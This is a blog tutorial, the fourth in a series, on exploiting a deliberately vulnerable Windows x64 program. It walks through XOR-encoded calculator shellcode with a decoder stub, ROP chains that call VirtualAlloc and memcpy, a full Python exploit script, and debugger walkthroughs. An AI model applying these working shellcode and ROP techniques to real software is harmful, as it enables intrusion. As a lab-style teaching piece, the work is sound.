---
title:  Buffer Overflows in the Modern Era - Part 4
header:
  teaser: "/assets/images/x64dbg.png"
categories:
  - Binary Exploitation
tags:
  - payload
  - shellcode
  - ROP Gadgets
  - '2025'
  - g3tsyst3m
  - buffer overflow
  - Windows 11
  - ASLR
  - DEP
---

Well we're almost there guys!  First, let's go over what we've accomplished so far.  We have explored, quite in depth I might add, the useage of `x64dbg`.  You should now have a solid understanding on how to navigate our vulnerable program in `x64dbg`, and locating and implementing ROP gadgets.  We've also managed to use ROP gadgets to setup the necessary arguments for `VirtualAlloc`.  So, we've allocated space for the highly anticipated shellcode we wish to execute, and now we're left with locating and executing `memcpy` so we can transfer the shellcode off the stack to the region of memory we've previously allocated.

***Encoding our Shellcode - Preparations and Explanation***
-

We will ultimately be spawning the ever familiar Windows calculator shellcode 😸  But there's a bit more to our shellcode payload than meets the eye 👁️  Let me elaborate a bit...so, I unintentionally coded the vulnerable executable using the following code:

```cpp
void vulnerable_function() {
    char buffer[275]; // medium-size buffer for the overflow
    std::cout << "Enter some input: ";
    std::cin >> buffer; // Unsafe function vulnerable to overflow
}
```

Here's the "problem" 😸  `std::cin >> buffer` is not suitable for capturing raw input in a buffer overflow demo — it stops on whitespace and doesn't let you inject characters like `0x20` (space), `0x10`, `nulls`, or other non-printables.  For a buffer overflow, especially where you're trying to demonstrate overwriting the stack using shellcode or a crafted payload, you want a vulnerable program that:

- Accepts raw bytes, including nulls and non-printable characters
- Doesn't sanitize or transform input
- Allows you to control exactly what is written into memory

So...what does that mean for us?  It means we need to encode our shellcode to bypass the input sanitization!  It's actually a pretty cool technique to learn so why not just combine it into today's post?  I mean, I have to go over it eventually anyways 😆  

***Encoding our shellcode and adding a Decoder Stub***
-

Here's what that looks like:

```cpp
payload = b"\x90\x90\x90\x90\x90\x90\x90\x90\x48\x31\xc9\x48\x8d\x35\xf8\xdd\xdd\xfd\x81\xc6\x22\x22\x22\x02\x48\x89\xf3\x48\x8d\x36\xb1\xcf\xb0\xac\x30\x06\x48\xff\xc6\x48\xff\xc9\x75\xf6\xe4\x2f\x40\x84\xe4\x2f\x48\x5c\xe4\x9d\x65\xc9\xe4\x27\xed\xcc\xe4\x27\xec\xb4\xe4\x27\xdc\xbc\xe4\x27\x9a\xe4\x27\x9a\xe4\x27\xf2\x9c\xe5\x25\x74\x27\xf7\x90\xe0\xad\x6f\xe4\x9d\x65\xca\x2d\x6d\x53\x24\xe4\x6d\x45\xa4\x27\xb8\xa7\xe0\xad\x6e\xe8\x27\xfe\xb8\xe1\x9d\x77\xe8\x27\xf6\x8c\xe1\xad\x6f\xe0\x25\x7d\xe4\x14\xfb\xc5\xc2\xe9\xd4\xc9\xcf\x3c\xe4\x6d\x4c\xa4\xe4\x6d\x44\xa4\xfc\xe4\x25\x4c\xe4\x2f\x68\xa4\xcb\x4f\xbb\x9d\x77\xed\x27\xf0\x27\xa8\xe0\xad\x6f\xe4\x53\x65\xe0\x27\xa4\xe0\x95\xa7\xd8\xaf\xd9\x4a\x60\xfd\xed\xf3\xe0\x25\x55\xe1\x9d\x77\xe8\x27\xf6\x88\xe1\xad\x6f\xe4\x53\x6d\xca\xe9\x27\x80\xe7\xe1\x9d\x77\xe8\x27\xf6\xb0\xe1\xad\x6f\xef\x27\xe8\x07\xa8\xe0\xad\x6c\xfc\xed\xf3\xe4\x9d\x6c\xfc\xe4\x14\xcf\xcd\xc0\xcf\x82\xc9\xd4\xc9\xfc\xe4\x25\x4d\xe4\x9d\x7e\xe4\x53\x6e\xe4\x2f\x40\x9c\xed\x53\x7b" #251 bytes
```

We've got a nop sled at the beginning which I'll explain in more detail later.  Anyways, the encoded shellcode above was produced by XOR'ing each byte with 0xAC, like so:

```python
shellcode =  b"\x48\x83\xec\x28\x48\x83\xe4\xf0\x48\x31\xc9\x65\x48\x8b\x41\x60\x48\x8b"
shellcode += b"\x40\x18\x48\x8b\x70\x10\x48\x8b\x36\x48\x8b\x36\x48\x8b\x5e\x30\x49\x89"
shellcode += b"\xd8\x8b\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9"
shellcode += b"\x08\x8b\x14\x0b\x4c\x01\xc2\x44\x8b\x52\x14\x4d\x31\xdb\x44\x8b\x5a\x20"
shellcode += b"\x4d\x01\xc3\x4c\x89\xd1\x48\xb8\x57\x69\x6e\x45\x78\x65\x63\x90\x48\xc1"
shellcode += b"\xe0\x08\x48\xc1\xe8\x08\x50\x48\x89\xe0\x48\x83\xc4\x08\x67\xe3\x17\x31"
shellcode += b"\xdb\x41\x8b\x5c\x8b\x04\x4c\x01\xc3\x48\xff\xc9\x4c\x8b\x08\x4c\x39\x0b"
shellcode += b"\x74\x03\x75\xe6\xcc\x51\x41\x5f\x4c\x89\xf9\x4d\x31\xdb\x44\x8b\x5a\x24"
shellcode += b"\x4d\x01\xc3\x48\xff\xc1\x66\x45\x8b\x2c\x4b\x4d\x31\xdb\x44\x8b\x5a\x1c"
shellcode += b"\x4d\x01\xc3\x43\x8b\x44\xab\x04\x4c\x01\xc0\x50\x41\x5f\x48\x31\xc0\x50"
shellcode += b"\x48\xb8\x63\x61\x6c\x63\x2e\x65\x78\x65\x50\x48\x89\xe1\x48\x31\xd2\x48"
shellcode += b"\xff\xc2\x48\x83\xec\x30\x41\xff\xd7"
#calc shellcode no nulls (207 bytes)

xor_key = 0xAC  # Use a key that avoids bad characters

encoded_shellcode = bytearray()
for byte in shellcode:
    encoded_shellcode.append(byte ^ xor_key)

print(f"Encoded Shellcode: {' '.join([f'0x{b:02x}' for b in encoded_shellcode])}")
print(f"XOR Key: 0x{xor_key:02x}")
```

I chose `0xAC` because it's a nice and cooperative byte to use with encoding our shellcode and removing all whitespace, null, and non-printable characters that would crash our exploit or in the least it would mangle our payload as it's being added to the stack.  

In the encoded shellcode above, I include a `decode stub routine` at the beginning of the shellcode that looks like this:

```nasm
0000000000E20007 | 48:31C9                  | xor rcx,rcx                                |
0000000000E2000A | 48:8D35 F8DDDDFD         | lea rsi,qword ptr ds:[FFFFFFFFFEBFDE09]    |  This is used simply to remove nulls
0000000000E20011 | 81C6 22222202            | add esi,2222222                            |  Continuation of the above
0000000000E20017 | 48:89F3                  | mov rbx,rsi                                |
0000000000E2001A | 48:8D36                  | lea rsi,qword ptr ds:[rsi]                 |  Load effective address of shellcode into RSI
0000000000E2001D | B1 CF                    | mov cl,CF                                  |  Set RCX as the length of the encoded shellcode
0000000000E2001F | B0 AC                    | mov al,AC                                  |  Load XOR key into RAX (64-bit)
0000000000E20021 | 3006                     | xor byte ptr ds:[rsi],al                   |  XOR 1 byte at a time
0000000000E20023 | 48:FFC6                  | inc rsi                                    |  Move to the next 8 bytes
0000000000E20026 | 48:FFC9                  | dec rcx                                    |  Decrement the remaining length by 8
0000000000E20029 | 75 F6                    | jne E20021                                 |  Repeat until RCX is zero
```

The `decoder stub` is this portion of our shellcode that I've highlighted below:

```python
"\x90\x90\x90\x90\x90\x90\x90\x90"
`"\x48\x31\xc9\x48\x8d\x35\xf8\xdd\xdd\xfd\x81\xc6\x22\x22\x22\x02\x48\x89\xf3\x48\x8d\x36\xb1\xcf\xb0\xac\x30\x06\x48\xff\xc6\x48\xff\xc9\x75\xf6"`
"\xe4\x2f\x40\x84\xe4\x2f\x48\x5c\xe4\x9d\x65\xc9\xe4\x27\xed\xcc\xe4\x27\xec\xb4\xe4\x27\xdc\xbc"
"\xe4\x27\x9a\xe4\x27\x9a\xe4\x27\xf2\x9c\xe5\x25\x74\x27\xf7\x90\xe0\xad\x6f\xe4\x9d\x65\xca\x2d"
"\x6d\x53\x24\xe4\x6d\x45\xa4\x27\xb8\xa7\xe0\xad\x6e\xe8\x27\xfe\xb8\xe1\x9d\x77\xe8\x27\xf6\x8c"
"\xe1\xad\x6f\xe0\x25\x7d\xe4\x14\xfb\xc5\xc2\xe9\xd4\xc9\xcf\x3c\xe4\x6d\x4c\xa4\xe4\x6d\x44\xa4"
"\xfc\xe4\x25\x4c\xe4\x2f\x68\xa4\xcb\x4f\xbb\x9d\x77\xed\x27\xf0\x27\xa8\xe0\xad\x6f\xe4\x53\x65"
"\xe0\x27\xa4\xe0\x95\xa7\xd8\xaf\xd9\x4a\x60\xfd\xed\xf3\xe0\x25\x55\xe1\x9d\x77\xe8\x27\xf6\x88"
"\xe1\xad\x6f\xe4\x53\x6d\xca\xe9\x27\x80\xe7\xe1\x9d\x77\xe8\x27\xf6\xb0\xe1\xad\x6f\xef\x27\xe8"
"\x07\xa8\xe0\xad\x6c\xfc\xed\xf3\xe4\x9d\x6c\xfc\xe4\x14\xcf\xcd\xc0\xcf\x82\xc9\xd4\xc9\xfc\xe4"
"\x25\x4d\xe4\x9d\x7e\xe4\x53\x6e\xe4\x2f\x40\x9c\xed\x53\x7b" #251 bytes
```

So, the decoder stub and encoded shellcode are included in our payload.  Now you see that there's more to this shellcode than meets the eye! haha

Okay, so now that you understand how the shellcode is put together, let's continue with collecting and employing our ROP gadgets to use memcpy and copy our shellcode to our allocated region of memory we previously allocated in Part 3 of this series.  Granted, we will be re-allocating again since we're actually using shellcode now instead of a bunch of 0x41's but you get the idea 😸  Part 3 was meant to serve in helping you learn how to execute `VirtualAlloc`.

***Memcpy***
-

> Here's how memcpy is laid out:

- Copies memory from src to dst
- On x64, the parameters for memcpy are passed in these registers:
   - rcx: Destination address (dst)
   - rdx: Source address (src)
   - r8: Number of bytes to copy (n)

***Setting the Memcpy - R8 Register***
-

Let's go ahead and get the worst register out of the way shall we?  😸  It's the worst because the `R8 register` just isn't used that much in our vulnerable binary.  So, finding ROP gadgets can be quite the challenge.  But, after longer than I'd like to admit, I found enough to make it happen.  Here's what it looks like:

```python
#r8 gadget setup
payload += struct.pack("<Q", 0x140001b58)  # push rax; pop rbx; pop rsi; pop rdi; ret;  <-- this is what will go into RSI
payload += struct.pack("<Q", 0x444444444)  # junk
payload += struct.pack("<Q", 0x444444444)  # junk

payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x140001240)  # xor r8d, r8d; mov edx, 2; xor ecx, ecx; call rax; 
payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x1400000AC)  # place 0x1000 on stack
payload += struct.pack("<Q", 0x14000199b)  # js 0x19f8; pop rsi; ret; 
payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x140001DDA)  # see below for this one

"""
0000000140001DDA | 44:8B00                  | mov r8d,dword ptr ds:[rax]           | rax:EntryPoint
0000000140001DDD | 45:85C0                  | test r8d,r8d                         |
0000000140001DE0 | 74 0D                    | je overflow.140001DEF                |
0000000140001DE2 | 48:8B50 10               | mov rdx,qword ptr ds:[rax+10]        | rdx:EntryPoint
0000000140001DE6 | 48:8B48 08               | mov rcx,qword ptr ds:[rax+8]         |
0000000140001DEA | 49:89F9                  | mov r9,rdi                           | r9:EntryPoint
0000000140001DED | FFD6                     | call rsi                             |
"""

#R8 should now be set to 0x90
```

***Setting the Memcpy - RCX Register***
-

This one isn't too cumbersome.  Below is the combination of ROP gadgets I came up with for setting RCX:

```python
#Gadget route for rcx
#====================
payload += struct.pack("<Q", 0x14000276f)  # xor ecx, ecx; mov rax, r9; ret; 
payload += struct.pack("<Q", 0x1400027a0)  # add ecx, ebx; mov rax, r9; ret; 
# RCX should now hold the dest address
#######################################################
```

***Setting the Memcpy - RDX Register***
-

The last register!  So, `memcpy` only requires setting three registers which is quite nice because finding ROP gadgets can be a bit labor intensive depending on the register that needs a value set!  One less register...yeah I'll take it!  Here's the code:

```python
#Gadget route for RDX
#######################################################
payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x5FFB01)     # 0x5FFBE0 (will have 200 added from edx)
payload += struct.pack("<Q", 0x1400025a6)  # add edx, eax; cmp dword ptr [rdx], 0x4550; je 0x25b8; ret; 
#RDX should now be set
```

***Time to call memcpy!***
-

Without further ado, here's the code to set and jump to memcpy.  I'll include the full code for setting 'VirtualAlloc' and 'memcpy' after this, I promise.

```python
#call memcpy!
#payload += struct.pack("<Q", 0x140001b5b)  # pop rdi, ret;
payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x140007D78)  # memcpy

payload += struct.pack("<Q", 0x14000192f)  # jmp rax; 
payload += struct.pack("<Q", 0x14000192f)  # jmp rax;
```

***Bringing it all together***
-

Okay, so I realize the code I'm about to paste may be a lot to digest at first, but bear with me.  I'll go over quite a bit and include screenshots per my usual approach so you can understand all that is happening.

```python

import struct
import subprocess

payload = b"\x90\x90\x90\x90\x90\x90\x90\x90\x48\x31\xc9\x48\x8d\x35\xf8\xdd\xdd\xfd\x81\xc6\x22\x22\x22\x02\x48\x89\xf3\x48\x8d\x36\xb1\xcf\xb0\xac\x30\x06\x48\xff\xc6\x48\xff\xc9\x75\xf6\xe4\x2f\x40\x84\xe4\x2f\x48\x5c\xe4\x9d\x65\xc9\xe4\x27\xed\xcc\xe4\x27\xec\xb4\xe4\x27\xdc\xbc\xe4\x27\x9a\xe4\x27\x9a\xe4\x27\xf2\x9c\xe5\x25\x74\x27\xf7\x90\xe0\xad\x6f\xe4\x9d\x65\xca\x2d\x6d\x53\x24\xe4\x6d\x45\xa4\x27\xb8\xa7\xe0\xad\x6e\xe8\x27\xfe\xb8\xe1\x9d\x77\xe8\x27\xf6\x8c\xe1\xad\x6f\xe0\x25\x7d\xe4\x14\xfb\xc5\xc2\xe9\xd4\xc9\xcf\x3c\xe4\x6d\x4c\xa4\xe4\x6d\x44\xa4\xfc\xe4\x25\x4c\xe4\x2f\x68\xa4\xcb\x4f\xbb\x9d\x77\xed\x27\xf0\x27\xa8\xe0\xad\x6f\xe4\x53\x65\xe0\x27\xa4\xe0\x95\xa7\xd8\xaf\xd9\x4a\x60\xfd\xed\xf3\xe0\x25\x55\xe1\x9d\x77\xe8\x27\xf6\x88\xe1\xad\x6f\xe4\x53\x6d\xca\xe9\x27\x80\xe7\xe1\x9d\x77\xe8\x27\xf6\xb0\xe1\xad\x6f\xef\x27\xe8\x07\xa8\xe0\xad\x6c\xfc\xed\xf3\xe4\x9d\x6c\xfc\xe4\x14\xcf\xcd\xc0\xcf\x82\xc9\xd4\xc9\xfc\xe4\x25\x4d\xe4\x9d\x7e\xe4\x53\x6e\xe4\x2f\x40\x9c\xed\x53\x7b" #251 bytes

payload += b"\x41" * 45 # padding/junk (45 bytes)


#original, decoded shellcode for referencing
#############################################

#shellcode =  b"\x48\x83\xec\x28\x48\x83\xe4\xf0\x48\x31\xc9\x65\x48\x8b\x41\x60\x48\x8b"
#shellcode += b"\x40\x18\x48\x8b\x70\x10\x48\x8b\x36\x48\x8b\x36\x48\x8b\x5e\x30\x49\x89"
#shellcode += b"\xd8\x8b\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9"
#shellcode += b"\x08\x8b\x14\x0b\x4c\x01\xc2\x44\x8b\x52\x14\x4d\x31\xdb\x44\x8b\x5a\x20"
#shellcode += b"\x4d\x01\xc3\x4c\x89\xd1\x48\xb8\x57\x69\x6e\x45\x78\x65\x63\x90\x48\xc1"
#shellcode += b"\xe0\x08\x48\xc1\xe8\x08\x50\x48\x89\xe0\x48\x83\xc4\x08\x67\xe3\x17\x31"
#shellcode += b"\xdb\x41\x8b\x5c\x8b\x04\x4c\x01\xc3\x48\xff\xc9\x4c\x8b\x08\x4c\x39\x0b"
#shellcode += b"\x74\x03\x75\xe6\xcc\x51\x41\x5f\x4c\x89\xf9\x4d\x31\xdb\x44\x8b\x5a\x24"
#shellcode += b"\x4d\x01\xc3\x48\xff\xc1\x66\x45\x8b\x2c\x4b\x4d\x31\xdb\x44\x8b\x5a\x1c"
#shellcode += b"\x4d\x01\xc3\x43\x8b\x44\xab\x04\x4c\x01\xc0\x50\x41\x5f\x48\x31\xc0\x50"
#shellcode += b"\x48\xb8\x63\x61\x6c\x63\x2e\x65\x78\x65\x50\x48\x89\xe1\x48\x31\xd2\x48"
#shellcode += b"\xff\xc2\x48\x83\xec\x30\x41\xff\xd7"
#calc shellcode no nulls (207 bytes)

#payload += shellcode 

#rop gadgets for setting the R9 register value
###################################

payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x140000018)  # 0x40
payload += struct.pack("<Q", 0x140007678)  # mov eax, dword ptr [rax]; ret;
payload += struct.pack("<Q", 0x140001b58)  # push rax; pop rbx; pop rsi; pop rdi; ret;
payload += b"\x90" * 16 
payload += struct.pack("<Q", 0x140007CA5)  # mov r9, rbx <see more below>

"""
0000000140007CA5 | 49:89D9                  | mov r9,rbx                           |
0000000140007CA8 | E8 D3FCFFFF              | call overflow3.140007980             |
0000000140007CAD | 48:98                    | cdqe                                 |
0000000140007CAF | 48:83C4 48               | add rsp,48                           |
0000000140007CB3 | 5B                       | pop rbx                              |
0000000140007CB4 | 5E                       | pop rsi                              |
0000000140007CB5 | 5F                       | pop rdi                              | 
0000000140007CB6 | 5D                       | pop rbp                              |
0000000140007CB7 | C3                       | ret                                  |
"""
payload += b"\x90" * 72 
payload += b"\x90" * 32 

#r9 register should now hold the value 0x40 (I hate this register)
###########################################

#r8 ROP gadgets (this works but RDX MUST be 0x3000)

payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x1400095AC)  # place 3000 on stack --> 0x00000001400095AC = 0x3000
payload += struct.pack("<Q", 0x140007678)  # mov eax, dword ptr [rax]; ret;
payload += struct.pack("<Q", 0x140006995)  # 0x0000000140006995: add edx, eax; mov eax, edx; ret; 

payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x1400095A0)  # place 3000 - 0xC on stack 

payload += struct.pack("<Q", 0x140002410)  # 0000000140002410


#rop gadget(s) for setting the RCX register value
###################################################
payload += struct.pack("<Q", 0x14000276f)  # xor ecx, ecx; mov rax, r9; ret; 
# rcx should now be set to 0
###################################################

#rop gadgets for setting the RDX register value
#####################################################
payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x140001243)  # mov edx, 2; xor ecx, ecx; call rax; 
payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x1400000AC)  # place 1000 on stack --> 0x00000001400000AC = 0x1000
payload += struct.pack("<Q", 0x140007678)  # mov eax, dword ptr [rax]; ret;
payload += struct.pack("<Q", 0x140006995)  # add edx, eax; mov eax, edx; ret; 
# RDX should now be set to 1002 (ideally 1000 but I got tired of mathing :D )
######################################################



#VirtualAlloc !!!
######################################################
payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x14000D288)  # virtualalloc import address
payload += struct.pack("<Q", 0x140001fb3)  # jmp qword ptr [rax]; 

######################################################


#memcpy
#copies memory from src to dst
#On x64, the parameters for memcpy are passed in these registers:

#rcx: Destination address (dst)
#rdx: Source address (src)
#r8: Number of bytes to copy (n)

#################################################################
#memcpy
#################################################################

#r8 gadget setup
payload += struct.pack("<Q", 0x140001b58)  # push rax; pop rbx; pop rsi; pop rdi; ret;  <-- this is what will go into RSI
payload += struct.pack("<Q", 0x444444444)  # junk
payload += struct.pack("<Q", 0x444444444)  # junk

payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x140001240)  # xor r8d, r8d; mov edx, 2; xor ecx, ecx; call rax; 
payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x1400000AC)  # place 0x1000 on stack
payload += struct.pack("<Q", 0x14000199b)  # js 0x19f8; pop rsi; ret; 
payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x140001DDA)  # see below for this one

"""
0000000140001DDA | 44:8B00                  | mov r8d,dword ptr ds:[rax]           | rax:EntryPoint
0000000140001DDD | 45:85C0                  | test r8d,r8d                         |
0000000140001DE0 | 74 0D                    | je overflow.140001DEF                |
0000000140001DE2 | 48:8B50 10               | mov rdx,qword ptr ds:[rax+10]        | rdx:EntryPoint
0000000140001DE6 | 48:8B48 08               | mov rcx,qword ptr ds:[rax+8]         |
0000000140001DEA | 49:89F9                  | mov r9,rdi                           | r9:EntryPoint
0000000140001DED | FFD6                     | call rsi                             |
"""

#R8 should now be set to 0x90


#Gadget route for rcx
#====================

payload += struct.pack("<Q", 0x14000276f)  # xor ecx, ecx; mov rax, r9; ret; 
payload += struct.pack("<Q", 0x1400027a0)  # add ecx, ebx; mov rax, r9; ret; 
# RCX should now hold the dest address
#######################################################

#Gadget route for RDX
#######################################################
payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x5FFB01)     # 0x5FFBE0 (will have 200 added from edx)
payload += struct.pack("<Q", 0x1400025a6)  # add edx, eax; cmp dword ptr [rdx], 0x4550; je 0x25b8; ret; 
#RDX should now be set


#call memcpy!
payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x140007D78)  # memcpy (want to jmp to this in the future!)

payload += struct.pack("<Q", 0x14000192f)  # jmp rax; 
payload += struct.pack("<Q", 0x14000192f)  # jmp rax;

# Run the vulnerable program and supply the payload
process = subprocess.Popen(
    ["C:/Users/robbi/Documents/GitHub/elevationstation_local/overflow3.exe"],  # Replace with the path to your compiled binary
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE
)

#uncomment to allow debugging in x64dbg
input("attach 'overflow.exe' to x64Dbg and press enter when you're ready to continue...")

# Send the payload
stdout, stderr = process.communicate(input=payload)

# Output the program's response
print(stdout.decode())
if stderr:
    print(stderr.decode())
```

***Executing our Exploit - Visuals***
-

**Go ahead and start your exploit via the familiar process we've been using:**

<img width="1802" height="688" alt="image" src="https://github.com/user-attachments/assets/1658d99f-5193-4b50-9acb-efc414b49b7d" />

**Now, let's step into our program's execution until we reach `VirtualAlloc`**

<img width="1213" height="165" alt="image" src="https://github.com/user-attachments/assets/8ca236da-c5dd-403e-975b-2ab40256b4b4" />

**Continue stepping through your code until you reach this point.  This is where we land on our ROP gadget chain for setting up the `R8 register`:**

<img width="1143" height="696" alt="image" src="https://github.com/user-attachments/assets/c7056346-a0d1-40ca-803e-e1b4fef321f4" />

**At this point, we're going to get creative.  We will go through all the necessary gadgets to add `0x1000` to the `R8 register`, which is the size in bytes we wish to copy.  We will also preemptively prepare for the RCX register which will hold the value for our destination memory address. In our case, that's where we want to copy the shellcode!  By popping the RAX value into RBX, we can begin to get setup for moving that value into RCX later.  Step through the program execution and look at your `RAX` and `RBX registers`.  You'll see RBX get populated with RAX's value, which is our destination memory address:**

<img width="1035" height="346" alt="image" src="https://github.com/user-attachments/assets/c2e57fc6-2a4c-4912-964d-92909ed54c49" />

**Now, step through the program once more until you get to here.  Check out the R8 register value.  It's set to 0x1000 !**

<img width="973" height="225" alt="image" src="https://github.com/user-attachments/assets/f55140e0-5bad-4e66-87f9-16ac7ec42152" />

**Step the the program until you get here.  We are now setting `RCX`, which will end up retrieving that value we have been holding on to in RBX 😺**

<img width="342" height="134" alt="image" src="https://github.com/user-attachments/assets/c92dae7d-1f5c-4f6a-a3bd-d1163e551ad7" />

**Step through the code some more until you get here and check out the RCX register!  Technically we added the EBX (32 bit value) to RCX, but it still accomplishes the same thing in our case**

<img width="1003" height="125" alt="image" src="https://github.com/user-attachments/assets/6f9226c2-2350-4a82-b086-7c396c2726e8" />

**Okay, the last register awaits!  I got REALLY creative on this one.  The RDX register needs to hold the Source Address value, which will be the address of our shellcode + nop sled + stub on the stack.  We will supply a memory address on the stack where its value is less than 200, because when we add 200 to that value, it needs to land on our nop sled.  Go all the way in your program's execution until you get here.  Check out the RDX value and then look at the stack.  RDX is now pointing to the start of our nop sled!  We're ready to go!**

<img width="1143" height="770" alt="image" src="https://github.com/user-attachments/assets/0bfd1008-d2c3-4458-833f-8f9fc06102a5" />

**Now that we have all three registers set, it's time to execute `memcpy`!  Continue stepping through the program until you get here:**

<img width="1198" height="125" alt="image" src="https://github.com/user-attachments/assets/23d7564f-2b3f-4ce1-9e24-769f2414d702" />

**We will now step into the memcpy API call and continue until you get here:**

<img width="909" height="138" alt="image" src="https://github.com/user-attachments/assets/64884807-8f27-4772-84c3-25203101c8e3" />

**This is the point where we really start to get excited 😸  You've now successfully used ROP Gadgets to execute both the VirtualAlloc API and memcpy API.  You copied your shellcode to a new RWX memory location that is under your control and has full execution and write permissions.  Follow the JMP instruction.  We're at our nop sled and decode reoutine stub!  We successfully copied everything from our payload (nop sled + decode stub routine + shellcode)!  This is a MASSIVE win 🥳**

<img width="960" height="388" alt="image" src="https://github.com/user-attachments/assets/670e605a-87bf-4bbe-a770-700f27d9c943" />

**Go ahead and step through the code and watch as your decoding stub decodes your shellcode right before your eyes.  If you follow RSI, you can see the actual byte by byte decoding take place.  RSI holds our encoded shellcode location in memory.**

<img width="1371" height="496" alt="image" src="https://github.com/user-attachments/assets/eb940748-f37c-4358-8a5f-ad9f438510f9" />

<img width="497" height="452" alt="image" src="https://github.com/user-attachments/assets/e725a2f0-23a7-4bbc-8c95-a08202f36c83" />

<img width="844" height="368" alt="image" src="https://github.com/user-attachments/assets/036c9573-3eca-41d8-9436-427cb23cff0c" />

**Step through your code and watch as it comes alive and your Windows Calculator shellcode starts to populate 😸 !!!**

**I set a breakpoint after the JNE (jump if not equal) instruction to walk through the shellcode just to build the momentum and add to the excitement factor lol 😺  Once the decode routine completes and you reach the end of your shellcode, you should see the highly anticipated calculator!**

<img width="1428" height="938" alt="image" src="https://github.com/user-attachments/assets/31ddf573-6973-4a41-92b9-7d2f2871869f" />

**Huge and I mean HUGE congrats for making it to the end.  But I need to let you know, that this isn't the true ENDING...MWUAHAHAHAHAHAHA.  We still need to do everything we just did but with all the Windows exploit protection and memory protection modules re-enabled.  I want to show you that we can truly bypass all windows protections and still execute our buffer overflow.  Parts 1 - 3 are just the preview of things to come.  In Part 5, we will bypass ASLR, re-enable all protections on Windows including BIOS protections, etc.  See you then!**

Source Code: [SourceCode](https://github.com/g3tsyst3m/CodefromBlog/tree/main/2025%20-%20Buffer%20Overflow%20Series)
> ANY.RUN Observations for the vulnerable binary and final python script:

<img width="1148" height="562" alt="image" src="https://github.com/user-attachments/assets/5aad91be-8e53-426f-83c8-d385527f9dec" />

<img width="1089" height="701" alt="image" src="https://github.com/user-attachments/assets/4867ea48-740f-451f-9112-365c08b92141" />

Full report/analysis: [full report](https://any.run/report/8f851af71079ffa30acc64470f32a8b6f02712052e7cb88f4a6ad07cddeec7c8/5256f3aa-efb6-4675-a856-810d6db71531)

Sandbox session: [Sandbox session](https://app.any.run/tasks/5256f3aa-efb6-4675-a856-810d6db71531)

<div style="text-align: right;">
Sponsored by:<br>
<img src="https://github.com/user-attachments/assets/111a0bb6-66e1-43b0-9a0a-5ce093f4b65e" alt="Sponsor logo" style="max-width: 200px;">
</div>




